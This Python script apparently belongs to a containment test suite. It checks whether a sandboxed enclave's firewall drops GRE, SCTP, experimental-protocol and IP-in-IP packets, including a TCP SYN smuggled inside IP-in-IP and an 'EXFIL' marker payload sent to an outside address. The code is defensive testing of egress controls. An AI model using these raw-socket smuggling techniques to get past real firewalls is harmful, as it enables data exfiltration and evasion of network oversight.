#!/usr/bin/env python3
#
# Copyright 2026 Scale Invariant, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Author: Brad Hyslop <bhyslop@scaleinvariant.org>
#
# RBTIS - Protocol smuggling via raw sockets
#
# Sortie: proto_smuggle_rawsock
# Front: network

import os
import socket
import struct
import time


SENTRY_IP = os.environ["RBRN_ENCLAVE_SENTRY_IP"]
BOTTLE_IP = os.environ["RBRN_ENCLAVE_BOTTLE_IP"]
ALLOWED_CIDR_IP = os.environ["RBRN_UPLINK_ALLOWED_CIDRS"].split(",")[0].split("/")[0]
EXTERNAL_IP = "8.8.8.8"
TIMEOUT = 3


def _build_ip_header(proto, src, dst, payload_len):
    """Build a minimal IPv4 header (no options)."""
    version_ihl = 0x45  # IPv4, 5 words (20 bytes)
    tos = 0
    total_len = 20 + payload_len
    ident = struct.unpack("!H", os.urandom(2))[0]
    flags_frag = 0x4000  # Don't Fragment
    ttl = 64
    checksum = 0  # kernel fills this for raw sockets with IP_HDRINCL
    src_bytes = socket.inet_aton(src)
    dst_bytes = socket.inet_aton(dst)

    header = struct.pack("!BBHHHBBH4s4s",
                         version_ihl, tos, total_len,
                         ident, flags_frag,
                         ttl, proto, checksum,
                         src_bytes, dst_bytes)
    return header


def _send_raw_proto(dest, proto_num, payload, label):
    """Send a raw IP packet with the given protocol number."""
    result = {"dest": dest, "proto": proto_num, "label": label,
              "sent": False, "replied": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto_num)
        sock.settimeout(TIMEOUT)
        sock.sendto(payload, (dest, 0))
        result["sent"] = True

        # Listen for any response
        deadline = time.time() + TIMEOUT
        while time.time() < deadline:
            sock.settimeout(max(0.1, deadline - time.time()))
            try:
                resp, addr = sock.recvfrom(4096)
                if addr[0] == dest or addr[0] != SENTRY_IP:
                    result["replied"] = True
                    result["reply_from"] = addr[0]
                    result["reply_len"] = len(resp)
                    break
            except socket.timeout:
                break
        sock.close()
    except PermissionError:
        result["error"] = "Raw socket permission denied (need CAP_NET_RAW)"
    except OSError as e:
        result["error"] = str(e)
    return result


def _send_ipip_encap(outer_dest, inner_dest, inner_port):
    """Send an IP-in-IP encapsulated TCP SYN to smuggle through the sentry."""
    result = {"outer_dest": outer_dest, "inner_dest": inner_dest,
              "sent": False, "replied": False}
    try:
        # Build inner TCP SYN packet
        src_port = 40000
        seq = struct.unpack("!I", os.urandom(4))[0]
        tcp_header = struct.pack("!HHIIBBHHH",
                                 src_port, inner_port,
                                 seq, 0,
                                 (5 << 4), 0x02,  # data offset=5, SYN flag
                                 65535, 0, 0)      # window, checksum, urgent

        inner_ip = _build_ip_header(6, BOTTLE_IP, inner_dest, len(tcp_header))
        inner_packet = inner_ip + tcp_header

        # Send as IP protocol 4 (IP-in-IP encapsulation)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 4)
        sock.settimeout(TIMEOUT)
        sock.sendto(inner_packet, (outer_dest, 0))
        result["sent"] = True

        try:
            resp, addr = sock.recvfrom(4096)
            result["replied"] = True
            result["reply_from"] = addr[0]
        except socket.timeout:
            pass
        sock.close()
    except PermissionError:
        result["error"] = "Raw socket permission denied"
    except OSError as e:
        result["error"] = str(e)
    return result


def run():
    """Protocol smuggling via raw sockets — test non-TCP/UDP protocol handling.

    Vector:
      The sentry's iptables FORWARD rules explicitly handle:
        - TCP/UDP to allowed CIDRs (permitted)
        - TCP/UDP port 53 for DNS (permitted)
        - ICMP (dropped on FORWARD)
        - RELATED,ESTABLISHED (permitted — conntrack stateful matching)

      But IP supports 256 protocol numbers. Protocols like GRE (47),
      IP-in-IP (4), SCTP (132), and others may not be explicitly handled.
      The default FORWARD DROP should catch them, but:

        1. The RELATED,ESTABLISHED rule fires before the DROP. If conntrack
           tracks a non-standard protocol connection (e.g., GRE has conntrack
           helpers), an outbound packet might create state that allows replies.
        2. MASQUERADE NAT may not correctly rewrite non-TCP/UDP protocols,
           potentially leaking internal IPs or creating confused state.
        3. IP-in-IP encapsulation could smuggle a TCP connection inside a
           protocol-4 wrapper, bypassing protocol-specific rules.

      Scapy-level raw sockets (CAP_NET_RAW) are available in the ifrit bottle,
      making this a realistic attack with the tools at hand.

    Detection logic:
      - Raw protocol packet gets any response from beyond enclave -> BREACH
      - IP-in-IP encap reaches inner destination                  -> BREACH
      - All non-standard protocols dropped silently                -> SECURE
    """
    assertions = []

    # Test 1: GRE (protocol 47) to external IP
    # GRE header: flags(2) + protocol_type(2)
    gre_payload = struct.pack("!HH", 0, 0x0800)  # No flags, inner protocol IPv4
    r = _send_raw_proto(EXTERNAL_IP, 47, gre_payload, "GRE")
    assertions.append({
        "name": "gre_external_blocked",
        "passed": not r.get("replied", False),
        "detail": f"GRE (proto 47) to {EXTERNAL_IP}: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 2: GRE to allowed CIDR — even allowed CIDRs should not forward GRE
    r = _send_raw_proto(ALLOWED_CIDR_IP, 47, gre_payload, "GRE-allowed")
    assertions.append({
        "name": "gre_allowed_cidr_blocked",
        "passed": not r.get("replied", False),
        "detail": f"GRE (proto 47) to allowed {ALLOWED_CIDR_IP}: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 3: SCTP (protocol 132) to external IP
    # SCTP INIT chunk: type(1) + flags(1) + length(2) + init_tag(4) + ...
    sctp_init = struct.pack("!BBHIHHI",
                            1, 0, 20,          # INIT chunk, length 20
                            0xDEADBEEF,         # initiate tag
                            65535,              # a-rwnd
                            1, 1)               # outbound/inbound streams
    # SCTP common header: src_port(2) + dst_port(2) + vtag(4) + checksum(4)
    sctp_header = struct.pack("!HHII", 40000, 80, 0, 0) + sctp_init
    r = _send_raw_proto(EXTERNAL_IP, 132, sctp_header, "SCTP")
    assertions.append({
        "name": "sctp_external_blocked",
        "passed": not r.get("replied", False),
        "detail": f"SCTP (proto 132) to {EXTERNAL_IP}: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 4: IP-in-IP (protocol 4) encapsulation — smuggle TCP inside
    r = _send_ipip_encap(ALLOWED_CIDR_IP, "93.184.216.34", 80)
    assertions.append({
        "name": "ipip_encap_blocked",
        "passed": not r.get("replied", False),
        "detail": f"IP-in-IP encap via {ALLOWED_CIDR_IP} to 93.184.216.34:80: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 5: Protocol 253 (experimental/reserved) to external
    r = _send_raw_proto(EXTERNAL_IP, 253, b"EXFIL:ifrit", "experimental-253")
    assertions.append({
        "name": "proto253_external_blocked",
        "passed": not r.get("replied", False),
        "detail": f"Proto 253 (experimental) to {EXTERNAL_IP}: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 6: Protocol 4 (IP-in-IP) to external directly
    r = _send_raw_proto(EXTERNAL_IP, 4, b"\x45" + b"\x00" * 19, "IPIP-direct")
    assertions.append({
        "name": "ipip_direct_external_blocked",
        "passed": not r.get("replied", False),
        "detail": f"IP-in-IP (proto 4) to {EXTERNAL_IP}: "
                  + (f"RESPONSE from {r.get('reply_from')}" if r.get("replied")
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    all_passed = all(a["passed"] for a in assertions)
    return {
        "verdict": "SECURE" if all_passed else "BREACH",
        "detail": "All non-standard IP protocols blocked by FORWARD DROP"
                  if all_passed
                  else "Non-standard protocol ESCAPED enclave — FORWARD chain has gaps",
        "assertions": assertions,
    }
